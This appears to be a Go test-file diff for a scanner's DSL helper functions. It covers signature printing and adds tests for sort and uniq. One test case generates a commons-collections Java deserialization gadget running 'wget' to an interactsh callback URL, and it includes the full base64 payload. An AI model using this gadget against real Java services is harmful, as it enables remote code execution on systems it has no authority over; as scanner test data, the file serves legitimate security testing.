@@ -94,83 +94,81 @@ func TestDslFunctionSignatures(t *testing.T) {
 }
 
 func TestGetPrintableDslFunctionSignatures(t *testing.T) {
-	t.Skip("the test is hard to maintain due to the presence of hardcoded color characters, it needs to be simplified #2473") // TODO
-	expected := `	[93maes_cbc[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93maes_gcm[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mbase64[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mbase64_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mbase64_py[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mbin_to_dec[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mcompare_versions[0m(firstVersion, constraints [38;5;208m...string[0m)[38;5;208m bool[0m
-	[93mconcat[0m(args [38;5;208m...interface{}[0m)[38;5;208m string[0m
-	[93mcontains[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mdate_time[0m(dateTimeFormat [38;5;208mstring[0m, optionalUnixTime [38;5;208minterface{}[0m)[38;5;208m string[0m
-	[93mdec_to_hex[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mends_with[0m(str [38;5;208mstring[0m, suffix [38;5;208m...string[0m)[38;5;208m bool[0m
-	[93mgenerate_java_gadget[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mgzip[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mgzip_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mhex_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mhex_encode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mhex_to_dec[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mhmac[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mhtml_escape[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mhtml_unescape[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mjoin[0m(separator [38;5;208mstring[0m, elements [38;5;208m...interface{}[0m)[38;5;208m string[0m
-	[93mlen[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mline_ends_with[0m(str [38;5;208mstring[0m, suffix [38;5;208m...string[0m)[38;5;208m bool[0m
-	[93mline_starts_with[0m(str [38;5;208mstring[0m, prefix [38;5;208m...string[0m)[38;5;208m bool[0m
-	[93mmd5[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mmmh3[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93moct_to_dec[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mprint_debug[0m(args [38;5;208m...interface{}[0m)[38;5;208m[0m
-	[93mrand_base[0m(length [38;5;208muint[0m, optionalCharSet [38;5;208mstring[0m)[38;5;208m string[0m
-	[93mrand_char[0m(optionalCharSet [38;5;208mstring[0m)[38;5;208m string[0m
-	[93mrand_int[0m(optionalMin, optionalMax [38;5;208muint[0m)[38;5;208m int[0m
-	[93mrand_ip[0m(cidr [38;5;208m...string[0m)[38;5;208m string[0m
-	[93mrand_text_alpha[0m(length [38;5;208muint[0m, optionalBadChars [38;5;208mstring[0m)[38;5;208m string[0m
-	[93mrand_text_alphanumeric[0m(length [38;5;208muint[0m, optionalBadChars [38;5;208mstring[0m)[38;5;208m string[0m
-	[93mrand_text_numeric[0m(length [38;5;208muint[0m, optionalBadNumbers [38;5;208mstring[0m)[38;5;208m string[0m
-	[93mregex[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mremove_bad_chars[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mrepeat[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mreplace[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mreplace_regex[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mreverse[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93msha1[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93msha256[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93msha512[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mstarts_with[0m(str [38;5;208mstring[0m, prefix [38;5;208m...string[0m)[38;5;208m bool[0m
-	[93msubstr[0m(str [38;5;208mstring[0m, start [38;5;208mint[0m, optionalEnd [38;5;208mint[0m)[38;5;208m[0m
-	[93mto_lower[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mto_number[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mto_string[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mto_unix_time[0m(input [38;5;208mstring[0m, optionalLayout [38;5;208mstring[0m)[38;5;208m int64[0m
-	[93mto_upper[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mtrim[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mtrim_left[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mtrim_prefix[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mtrim_right[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mtrim_space[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mtrim_suffix[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93munix_time[0m(optionalSeconds [38;5;208muint[0m)[38;5;208m float64[0m
-	[93murl_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93murl_encode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mwait_for[0m(seconds [38;5;208muint[0m)[38;5;208m[0m
-	[93mzlib[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
-	[93mzlib_decode[0m(arg1 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m
+	expected := `	aes_cbc(arg1, arg2 interface{}) interface{}
+	aes_gcm(arg1, arg2 interface{}) interface{}
+	base64(arg1 interface{}) interface{}
+	base64_decode(arg1 interface{}) interface{}
+	base64_py(arg1 interface{}) interface{}
+	bin_to_dec(arg1 interface{}) interface{}
+	compare_versions(firstVersion, constraints ...string) bool
+	concat(args ...interface{}) string
+	contains(arg1, arg2 interface{}) interface{}
+	contains_all(body interface{}, substrs ...string) bool
+	contains_any(body interface{}, substrs ...string) bool
+	date_time(dateTimeFormat string, optionalUnixTime interface{}) string
+	dec_to_hex(arg1 interface{}) interface{}
+	ends_with(str string, suffix ...string) bool
+	generate_java_gadget(arg1, arg2, arg3 interface{}) interface{}
+	gzip(arg1 interface{}) interface{}
+	gzip_decode(arg1 interface{}) interface{}
+	hex_decode(arg1 interface{}) interface{}
+	hex_encode(arg1 interface{}) interface{}
+	hex_to_dec(arg1 interface{}) interface{}
+	hmac(arg1, arg2, arg3 interface{}) interface{}
+	html_escape(arg1 interface{}) interface{}
+	html_unescape(arg1 interface{}) interface{}
+	join(separator string, elements ...interface{}) string
+	len(arg1 interface{}) interface{}
+	line_ends_with(str string, suffix ...string) bool
+	line_starts_with(str string, prefix ...string) bool
+	md5(arg1 interface{}) interface{}
+	mmh3(arg1 interface{}) interface{}
+	oct_to_dec(arg1 interface{}) interface{}
+	print_debug(args ...interface{})
+	rand_base(length uint, optionalCharSet string) string
+	rand_char(optionalCharSet string) string
+	rand_int(optionalMin, optionalMax uint) int
+	rand_ip(cidr ...string) string
+	rand_text_alpha(length uint, optionalBadChars string) string
+	rand_text_alphanumeric(length uint, optionalBadChars string) string
+	rand_text_numeric(length uint, optionalBadNumbers string) string
+	regex(arg1, arg2 interface{}) interface{}
+	remove_bad_chars(arg1, arg2 interface{}) interface{}
+	repeat(arg1, arg2 interface{}) interface{}
+	replace(arg1, arg2, arg3 interface{}) interface{}
+	replace_regex(arg1, arg2, arg3 interface{}) interface{}
+	reverse(arg1 interface{}) interface{}
+	sha1(arg1 interface{}) interface{}
+	sha256(arg1 interface{}) interface{}
+	sha512(arg1 interface{}) interface{}
+	sort(args ...interface{}) interface{}
+	starts_with(str string, prefix ...string) bool
+	substr(str string, start int, optionalEnd int)
+	to_lower(arg1 interface{}) interface{}
+	to_number(arg1 interface{}) interface{}
+	to_string(arg1 interface{}) interface{}
+	to_unix_time(input string, optionalLayout string) int64
+	to_upper(arg1 interface{}) interface{}
+	trim(arg1, arg2 interface{}) interface{}
+	trim_left(arg1, arg2 interface{}) interface{}
+	trim_prefix(arg1, arg2 interface{}) interface{}
+	trim_right(arg1, arg2 interface{}) interface{}
+	trim_space(arg1 interface{}) interface{}
+	trim_suffix(arg1, arg2 interface{}) interface{}
+	uniq(args ...interface{}) interface{}
+	unix_time(optionalSeconds uint) float64
+	url_decode(arg1 interface{}) interface{}
+	url_encode(arg1 interface{}) interface{}
+	wait_for(seconds uint)
+	zlib(arg1 interface{}) interface{}
+	zlib_decode(arg1 interface{}) interface{}
 `
-	t.Run("with coloring", func(t *testing.T) {
-		coloredSignatures := GetPrintableDslFunctionSignatures(false)
-		assert.Equal(t, expected, coloredSignatures)
-	})
 
-	t.Run("without coloring", func(t *testing.T) {
-		var decolorizerRegex = regexp.MustCompile(`\x1B\[[0-9;]*[a-zA-Z]`)
-		expectedSignaturesWithoutColor := decolorizerRegex.ReplaceAllString(expected, "")
+	signatures := GetPrintableDslFunctionSignatures(true)
+	assert.Equal(t, expected, signatures)
 
-		assert.Equal(t, expectedSignaturesWithoutColor, GetPrintableDslFunctionSignatures(true))
-	})
+	coloredSignatures := GetPrintableDslFunctionSignatures(false)
+	require.Contains(t, coloredSignatures, `[93maes_cbc[0m(arg1, arg2 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m`, "could not get colored signatures")
 }
 
 func TestDslExpressions(t *testing.T) {
@@ -213,39 +211,45 @@ func TestDslExpressions(t *testing.T) {
 		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))`:                               "Hello",
 		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       "Hello",
 		`generate_java_gadget("commons-collections3.1", "wget https://{{interactsh-url}}", "base64")`: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH3dnZXQgaHR0cHM6Ly97e2ludGVyYWN0c2gtdXJsfX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
-		`base64_decode("SGVsbG8=")`:                        "Hello",
-		`hex_decode("6161")`:                               "aa",
-		`len("Hello")`:                                     float64(5),
-		`len(1234)`:                                        float64(4),
-		`contains("Hello", "lo")`:                          true,
-		`starts_with("Hello", "He")`:                       true,
-		`ends_with("Hello", "lo")`:                         true,
-		"line_starts_with('Hi\nHello', 'He')":              true, // back quotes do not support escape sequences
-		"line_ends_with('Hii\nHello', 'ii')":               true, // back quotes do not support escape sequences
-		`regex("H([a-z]+)o", "Hello")`:                     true,
-		`wait_for(1)`:                                      nil,
-		`print_debug(1+2, "Hello")`:                        nil,
-		`to_number('4')`:                                   float64(4),
-		`to_string(4)`:                                     "4",
-		`dec_to_hex(7001)`:                                 "1b59",
-		`hex_to_dec("ff")`:                                 float64(255),
-		`hex_to_dec("0xff")`:                               float64(255),
-		`oct_to_dec("0o1234567")`:                          float64(342391),
-		`oct_to_dec("1234567")`:                            float64(342391),
-		`oct_to_dec(1234567)`:                              float64(342391),
-		`bin_to_dec("0b1010")`:                             float64(10),
-		`bin_to_dec("1010")`:                               float64(10),
-		`bin_to_dec(1010)`:                                 float64(10),
-		`compare_versions('v1.0.0', '<1.1.1')`:             true,
-		`compare_versions('v1.1.1', '>v1.1.0')`:            true,
-		`compare_versions('v1.0.0', '>v0.0.1,<v1.0.1')`:    true,
-		`compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`: true,
-		`hmac('sha1', 'test', 'scrt')`:                     "8856b111056d946d5c6c92a21b43c233596623c6",
-		`hmac('sha256', 'test', 'scrt')`:                   "1f1bff5574f18426eb376d6dd5368a754e67a798aa2074644d5e3fd4c90c7a92",
-		`hmac('sha512', 'test', 'scrt')`:                   "1d3fff1dbb7369c1615ffb494813146bea051ce07e5d44bdeca539653ea97656bf9d38db264cddbe6a83ea15139c8f861a7e73e10e43ad4865e852a9ee6de2e9",
-		`substr('xxtestxxx',2)`:                            "testxxx",
-		`substr('xxtestxxx',2,-2)`:                         "testx",
-		`substr('xxtestxxx',2,6)`:                          "test",
+		`base64_decode("SGVsbG8=")`:                               "Hello",
+		`hex_decode("6161")`:                                      "aa",
+		`len("Hello")`:                                            float64(5),
+		`len(1234)`:                                               float64(4),
+		`contains("Hello", "lo")`:                                 true,
+		`starts_with("Hello", "He")`:                              true,
+		`ends_with("Hello", "lo")`:                                true,
+		"line_starts_with('Hi\nHello', 'He')":                     true, // back quotes do not support escape sequences
+		"line_ends_with('Hii\nHello', 'ii')":                      true, // back quotes do not support escape sequences
+		`regex("H([a-z]+)o", "Hello")`:                            true,
+		`wait_for(1)`:                                             nil,
+		`print_debug(1+2, "Hello")`:                               nil,
+		`to_number('4')`:                                          float64(4),
+		`to_string(4)`:                                            "4",
+		`dec_to_hex(7001)`:                                        "1b59",
+		`hex_to_dec("ff")`:                                        float64(255),
+		`hex_to_dec("0xff")`:                                      float64(255),
+		`oct_to_dec("0o1234567")`:                                 float64(342391),
+		`oct_to_dec("1234567")`:                                   float64(342391),
+		`oct_to_dec(1234567)`:                                     float64(342391),
+		`bin_to_dec("0b1010")`:                                    float64(10),
+		`bin_to_dec("1010")`:                                      float64(10),
+		`bin_to_dec(1010)`:                                        float64(10),
+		`compare_versions('v1.0.0', '<1.1.1')`:                    true,
+		`compare_versions('v1.1.1', '>v1.1.0')`:                   true,
+		`compare_versions('v1.0.0', '>v0.0.1,<v1.0.1')`:           true,
+		`compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`:        true,
+		`hmac('sha1', 'test', 'scrt')`:                            "8856b111056d946d5c6c92a21b43c233596623c6",
+		`hmac('sha256', 'test', 'scrt')`:                          "1f1bff5574f18426eb376d6dd5368a754e67a798aa2074644d5e3fd4c90c7a92",
+		`hmac('sha512', 'test', 'scrt')`:                          "1d3fff1dbb7369c1615ffb494813146bea051ce07e5d44bdeca539653ea97656bf9d38db264cddbe6a83ea15139c8f861a7e73e10e43ad4865e852a9ee6de2e9",
+		`substr('xxtestxxx',2)`:                                   "testxxx",
+		`substr('xxtestxxx',2,-2)`:                                "testx",
+		`substr('xxtestxxx',2,6)`:                                 "test",
+		`sort("a1b2c3d4e5")`:                                      "12345abcde",
+		`sort("b", "a", "2", "c", "3", "1", "d", "4")`:            []string{"1", "2", "3", "4", "a", "b", "c", "d"},
+		`join(" ", sort("b", "a", "2", "c", "3", "1", "d", "4"))`: "1 2 3 4 a b c d",
+		`uniq("abcabdaabbccd")`:                                   "abcd",
+		`uniq("ab", "cd", "12", "34", "12", "cd")`:                []string{"ab", "cd", "12", "34"},
+		`join(" ", uniq("ab", "cd", "12", "34", "12", "cd"))`:     "ab cd 12 34",
 	}
 
 	testDslExpressionScenarios(t, dslExpressions)
@@ -303,12 +307,12 @@ func TestDateTimeDslExpressions(t *testing.T) {
 		now := time.Now()
 
 		dslExpressions := map[string]interface{}{
-			`date_time("%Y-%M-%D")`:                      fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
-			`date_time("%Y-%M-%D", unix_time())`:         fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
-			`date_time("%Y-%M-%D", 1642032000)`:          time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("2006-01-02"),
-			`date_time("%H-%m")`:                         fmt.Sprintf("%02d-%02d", now.Hour(), now.Minute()),
-			`date_time("02-01-2006 15:04", unix_time())`: now.Format("02-01-2006 15:04"),
-			`date_time("02-01-2006 15:04", 1642032000)`:  time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("02-01-2006 15:00"),
+			`date_time("%Y-%M-%D")`:                fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
+			`date_time("%Y-%M-%D", unix_time())`:   fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
+			`date_time("%Y-%M-%D", 1642032000)`:    time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("2006-01-02"),
+			`date_time("%H-%m")`:                   fmt.Sprintf("%02d-%02d", now.Hour(), now.Minute()),
+			`date_time("02-01-2006", unix_time())`: now.Format("02-01-2006"),
+			`date_time("02-01-2006", 1642032000)`:  time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("02-01-2006"),
 		}
 
 		testDslExpressionScenarios(t, dslExpressions)
